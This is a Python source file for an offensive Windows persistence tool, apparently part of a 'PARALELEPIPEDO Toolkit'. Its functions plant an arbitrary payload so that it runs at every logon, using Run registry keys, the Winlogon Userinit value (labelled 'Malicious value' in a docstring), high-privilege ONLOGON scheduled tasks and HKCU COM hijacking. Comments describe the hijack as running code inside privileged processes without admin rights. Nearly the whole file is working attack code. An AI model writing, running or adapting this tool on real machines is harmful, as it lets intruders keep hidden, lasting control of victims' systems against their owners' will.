# =============================================================================
# Filename   : reg_persist.py
# Description: Registry-based persistence tool for Windows. Supports multiple
#              persistence locations including Run keys, Winlogon Userinit,
#              Scheduled Tasks via schtasks.exe, and COM hijacking stubs.
# Author     : PARALELEPIPEDO Toolkit
# =============================================================================

import argparse
import ctypes
import json
import subprocess
import sys
import winreg
from datetime import datetime

from colorama import Fore, Style, init

init(autoreset=True)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
HKCU_RUN = (winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run")
HKLM_RUN = (winreg.HKEY_LOCAL_MACHINE,
            r"Software\Microsoft\Windows\CurrentVersion\Run")
HKCU_WINLOGON = (winreg.HKEY_CURRENT_USER,
                 r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon")
# COM hijacking: HKCU\Software\Classes\CLSID\<CLSID>\InprocServer32
# Overrides the HKCR (HKLM) registration without admin rights.
# The CLSID below (WBEM Locator) is commonly loaded by explorer.exe and
# other privileged processes — a well-known hijack vector.
COM_CLSID = "{B196B286-BAB4-101A-B69C-00AA00341D07}"
HKCU_COM_BASE = r"Software\Classes\CLSID"


def banner():
    print(Fore.CYAN + r"""
  ____            _____               _     _
 |  _ \ ___  __ |_   _|__   ___  _ _| |_  (_)
 | |_) / _ \/ _` || |/ _ \ / _ \| '_| __|  _
 |  _ <  __/ (_| || |  __/|  __/| | | |_  (_)
 |_| \_\___|\__, ||_|\___| \___||_|  \__| (o)
              |___/   reg_persist.py — PARALELEPIPEDO
""" + Style.RESET_ALL)


# ---------------------------------------------------------------------------
# Privilege helpers
# ---------------------------------------------------------------------------
def is_admin() -> bool:
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


# ---------------------------------------------------------------------------
# Registry helpers
# ---------------------------------------------------------------------------
def _open_key(hive, subkey: str, write: bool = False):
    access = winreg.KEY_SET_VALUE | winreg.KEY_QUERY_VALUE if write else winreg.KEY_READ
    return winreg.OpenKey(hive, subkey, 0, access)


def _create_key(hive, subkey: str):
    return winreg.CreateKeyEx(hive, subkey, 0,
                               winreg.KEY_SET_VALUE | winreg.KEY_QUERY_VALUE)


# ---------------------------------------------------------------------------
# Method: HKCU Run key
# ---------------------------------------------------------------------------
def add_run_hkcu(name: str, payload: str) -> dict:
    hive, subkey = HKCU_RUN
    try:
        with _create_key(hive, subkey) as k:
            winreg.SetValueEx(k, name, 0, winreg.REG_SZ, payload)
        print(Fore.GREEN + f"[+] HKCU Run: '{name}' -> '{payload}'")
        return {"method": "hkcu_run", "name": name, "payload": payload, "status": "success"}
    except Exception as e:
        print(Fore.RED + f"[-] HKCU Run failed: {e}")
        return {"method": "hkcu_run", "name": name, "status": "error", "error": str(e)}


def add_run_hklm(name: str, payload: str) -> dict:
    if not is_admin():
        print(Fore.YELLOW + "[!] HKLM Run requires admin privileges. Skipping.")
        return {"method": "hklm_run", "name": name, "status": "skipped", "reason": "no_admin"}
    hive, subkey = HKLM_RUN
    try:
        with _create_key(hive, subkey) as k:
            winreg.SetValueEx(k, name, 0, winreg.REG_SZ, payload)
        print(Fore.GREEN + f"[+] HKLM Run: '{name}' -> '{payload}'")
        return {"method": "hklm_run", "name": name, "payload": payload, "status": "success"}
    except Exception as e:
        print(Fore.RED + f"[-] HKLM Run failed: {e}")
        return {"method": "hklm_run", "name": name, "status": "error", "error": str(e)}


def remove_run(name: str, hklm: bool = False) -> dict:
    hive, subkey = (HKLM_RUN if hklm else HKCU_RUN)
    label = "HKLM" if hklm else "HKCU"
    if hklm and not is_admin():
        print(Fore.YELLOW + "[!] Removing HKLM Run key requires admin.")
        return {"method": f"{label.lower()}_run_remove", "name": name,
                "status": "skipped", "reason": "no_admin"}
    try:
        with _open_key(hive, subkey, write=True) as k:
            winreg.DeleteValue(k, name)
        print(Fore.GREEN + f"[+] Removed {label} Run key: '{name}'")
        return {"method": f"{label.lower()}_run_remove", "name": name, "status": "success"}
    except FileNotFoundError:
        print(Fore.YELLOW + f"[!] {label} Run key '{name}' not found.")
        return {"method": f"{label.lower()}_run_remove", "name": name,
                "status": "not_found"}
    except Exception as e:
        print(Fore.RED + f"[-] Remove {label} Run failed: {e}")
        return {"method": f"{label.lower()}_run_remove", "name": name,
                "status": "error", "error": str(e)}


def list_run(hklm: bool = False) -> list:
    hive, subkey = (HKLM_RUN if hklm else HKCU_RUN)
    label = "HKLM" if hklm else "HKCU"
    entries = []
    try:
        with _open_key(hive, subkey) as k:
            i = 0
            while True:
                try:
                    vname, vdata, _ = winreg.EnumValue(k, i)
                    entries.append({"name": vname, "payload": vdata})
                    print(Fore.CYAN + f"  [{label}] {vname}" +
                          Fore.WHITE + f" -> {vdata}")
                    i += 1
                except OSError:
                    break
    except Exception as e:
        print(Fore.RED + f"[-] Could not read {label} Run: {e}")
    return entries


# ---------------------------------------------------------------------------
# Method: Winlogon Userinit
# ---------------------------------------------------------------------------
def add_winlogon(name: str, payload: str) -> dict:
    """
    Appends the payload to the Userinit value in Winlogon.
    Default value: C:\\Windows\\system32\\userinit.exe,
    Malicious value: C:\\Windows\\system32\\userinit.exe,<payload>,
    This causes the payload to be executed at every interactive logon.
    """
    hive, subkey = HKCU_WINLOGON
    try:
        with _create_key(hive, subkey) as k:
            try:
                current, _ = winreg.QueryValueEx(k, "Userinit")
            except FileNotFoundError:
                current = r"C:\Windows\system32\userinit.exe,"
            if payload not in current:
                new_val = current.rstrip(",") + f",{payload},"
                winreg.SetValueEx(k, "Userinit", 0, winreg.REG_SZ, new_val)
                print(Fore.GREEN + f"[+] Winlogon Userinit set to: {new_val}")
            else:
                print(Fore.YELLOW + "[!] Payload already present in Userinit.")
            return {"method": "winlogon", "name": name, "payload": payload,
                    "status": "success"}
    except Exception as e:
        print(Fore.RED + f"[-] Winlogon persistence failed: {e}")
        return {"method": "winlogon", "name": name, "status": "error", "error": str(e)}


def remove_winlogon(payload: str) -> dict:
    hive, subkey = HKCU_WINLOGON
    try:
        with _open_key(hive, subkey, write=True) as k:
            current, _ = winreg.QueryValueEx(k, "Userinit")
            new_val = current.replace(f",{payload},", ",").replace(f",{payload}", "")
            winreg.SetValueEx(k, "Userinit", 0, winreg.REG_SZ, new_val)
            print(Fore.GREEN + f"[+] Removed payload from Winlogon Userinit.")
            return {"method": "winlogon_remove", "status": "success"}
    except Exception as e:
        print(Fore.RED + f"[-] Winlogon remove failed: {e}")
        return {"method": "winlogon_remove", "status": "error", "error": str(e)}


# ---------------------------------------------------------------------------
# Method: Scheduled Task (schtasks.exe)
# ---------------------------------------------------------------------------
def add_task(name: str, payload: str) -> dict:
    cmd = [
        "schtasks", "/Create",
        "/TN", name,
        "/TR", payload,
        "/SC", "ONLOGON",
        "/RL", "HIGHEST",
        "/F"
    ]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            print(Fore.GREEN + f"[+] Scheduled Task '{name}' created.")
            return {"method": "task", "name": name, "payload": payload, "status": "success"}
        else:
            err = result.stderr.strip() or result.stdout.strip()
            print(Fore.RED + f"[-] schtasks create failed: {err}")
            return {"method": "task", "name": name, "status": "error", "error": err}
    except Exception as e:
        print(Fore.RED + f"[-] schtasks exception: {e}")
        return {"method": "task", "name": name, "status": "error", "error": str(e)}


def remove_task(name: str) -> dict:
    cmd = ["schtasks", "/Delete", "/TN", name, "/F"]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            print(Fore.GREEN + f"[+] Scheduled Task '{name}' deleted.")
            return {"method": "task_remove", "name": name, "status": "success"}
        else:
            err = result.stderr.strip() or result.stdout.strip()
            print(Fore.YELLOW + f"[!] schtasks delete: {err}")
            return {"method": "task_remove", "name": name, "status": "error", "error": err}
    except Exception as e:
        print(Fore.RED + f"[-] schtasks exception: {e}")
        return {"method": "task_remove", "name": name, "status": "error", "error": str(e)}


def list_tasks() -> list:
    cmd = ["schtasks", "/Query", "/FO", "LIST"]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        tasks = []
        current = {}
        for line in result.stdout.splitlines():
            if line.startswith("TaskName:"):
                if current:
                    tasks.append(current)
                current = {"name": line.split(":", 1)[1].strip()}
            elif line.startswith("Status:") and current:
                current["status"] = line.split(":", 1)[1].strip()
        if current:
            tasks.append(current)
        for t in tasks:
            print(Fore.CYAN + f"  [Task] {t.get('name')} — {t.get('status', '?')}")
        return tasks
    except Exception as e:
        print(Fore.RED + f"[-] schtasks list failed: {e}")
        return []


# ---------------------------------------------------------------------------
# Method: COM Hijacking
# ---------------------------------------------------------------------------
def add_com(name: str, payload: str, clsid: str = COM_CLSID) -> dict:
    """
    COM Hijacking via HKCU\\Software\\Classes\\CLSID.

    Technique overview:
    - Windows resolves CLSIDs by checking HKCU before HKLM/HKCR.
    - By registering a CLSID in HKCU (no admin needed), we can redirect
      calls to that COM object to our own DLL (InprocServer32) or executable.
    - When a privileged process (e.g., explorer.exe, Task Scheduler) loads
      the hijacked CLSID, our payload executes in its context.
    - Common targets: {BCDE0395-E52F-467C-8E3D-C4579291692E} (MMDeviceEnumerator),
      {B196B286-BAB4-101A-B69C-00AA00341D07} (IDispatch proxy), etc.
    - The payload here is registered as LocalServer32 (EXE path) because
      InprocServer32 requires a DLL. Adjust accordingly for DLL payloads.
    """
    base = rf"{HKCU_COM_BASE}\{clsid}"
    server_key = rf"{base}\LocalServer32"
    try:
        with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, base, 0,
                                 winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, "", 0, winreg.REG_SZ, name)
        with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, server_key, 0,
                                 winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, "", 0, winreg.REG_SZ, payload)
        print(Fore.GREEN + f"[+] COM hijack registered: HKCU\\{base}")
        print(Fore.GREEN + f"    CLSID : {clsid}")
        print(Fore.GREEN + f"    Server: {payload}")
        return {"method": "com", "name": name, "clsid": clsid,
                "payload": payload, "status": "success"}
    except Exception as e:
        print(Fore.RED + f"[-] COM hijack failed: {e}")
        return {"method": "com", "name": name, "status": "error", "error": str(e)}


def remove_com(clsid: str = COM_CLSID) -> dict:
    import shutil
    base = rf"{HKCU_COM_BASE}\{clsid}"
    try:
        winreg.DeleteKeyEx(winreg.HKEY_CURRENT_USER,
                           rf"{base}\LocalServer32")
        winreg.DeleteKeyEx(winreg.HKEY_CURRENT_USER, base)
        print(Fore.GREEN + f"[+] COM hijack removed: {clsid}")
        return {"method": "com_remove", "clsid": clsid, "status": "success"}
    except FileNotFoundError:
        print(Fore.YELLOW + f"[!] COM key not found: {clsid}")
        return {"method": "com_remove", "clsid": clsid, "status": "not_found"}
    except Exception as e:
        print(Fore.RED + f"[-] COM remove failed: {e}")
        return {"method": "com_remove", "clsid": clsid, "status": "error", "error": str(e)}


# ---------------------------------------------------------------------------
# List dispatcher
# ---------------------------------------------------------------------------
def cmd_list(method: str) -> list:
    results = []
    if method in ("run", "all"):
        print(Fore.YELLOW + "\n[*] HKCU Run entries:")
        results += list_run(hklm=False)
        if is_admin():
            print(Fore.YELLOW + "\n[*] HKLM Run entries:")
            results += list_run(hklm=True)
    if method in ("task", "all"):
        print(Fore.YELLOW + "\n[*] Scheduled Tasks:")
        results += list_tasks()
    return results


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="reg_persist.py",
        description="Registry persistence tool — PARALELEPIPEDO Toolkit"
    )
    p.add_argument("--method", choices=["run", "winlogon", "task", "com", "all"],
                   default="run", help="Persistence method")
    action = p.add_mutually_exclusive_group(required=True)
    action.add_argument("--add", action="store_true", help="Add persistence entry")
    action.add_argument("--remove", action="store_true", help="Remove persistence entry")
    action.add_argument("--list", action="store_true", help="List persistence entries")
    p.add_argument("--name", help="Entry name / task name")
    p.add_argument("--payload", help="Path or command to persist")
    p.add_argument("--hklm", action="store_true",
                   help="Target HKLM instead of HKCU (requires admin)")
    p.add_argument("--clsid", default=COM_CLSID,
                   help="CLSID for COM hijacking")
    p.add_argument("--json-out", metavar="FILE",
                   help="Write JSON summary to file")
    return p


def main():
    banner()
    parser = build_parser()
    args = parser.parse_args()
    results = []
    ts = datetime.utcnow().isoformat() + "Z"

    if args.add:
        if not args.name or not args.payload:
            parser.error("--add requires --name and --payload")
        m = args.method
        if m == "run":
            results.append(add_run_hkcu(args.name, args.payload))
            if args.hklm:
                results.append(add_run_hklm(args.name, args.payload))
        elif m == "winlogon":
            results.append(add_winlogon(args.name, args.payload))
        elif m == "task":
            results.append(add_task(args.name, args.payload))
        elif m == "com":
            results.append(add_com(args.name, args.payload, clsid=args.clsid))
        elif m == "all":
            results.append(add_run_hkcu(args.name, args.payload))
            if args.hklm:
                results.append(add_run_hklm(args.name, args.payload))
            results.append(add_winlogon(args.name, args.payload))
            results.append(add_task(args.name, args.payload))
            results.append(add_com(args.name, args.payload, clsid=args.clsid))

    elif args.remove:
        if not args.name:
            parser.error("--remove requires --name")
        m = args.method
        if m in ("run", "all"):
            results.append(remove_run(args.name, hklm=False))
            if args.hklm:
                results.append(remove_run(args.name, hklm=True))
        if m in ("winlogon", "all"):
            results.append(remove_winlogon(args.payload or ""))
        if m in ("task", "all"):
            results.append(remove_task(args.name))
        if m in ("com", "all"):
            results.append(remove_com(clsid=args.clsid))

    elif args.list:
        results = cmd_list(args.method)

    summary = {"timestamp": ts, "results": results}
    print(Fore.CYAN + "\n[*] JSON Summary:")
    print(json.dumps(summary, indent=2))

    if args.json_out:
        with open(args.json_out, "w") as f:
            json.dump(summary, f, indent=2)
        print(Fore.GREEN + f"[+] JSON written to {args.json_out}")


if __name__ == "__main__":
    main()
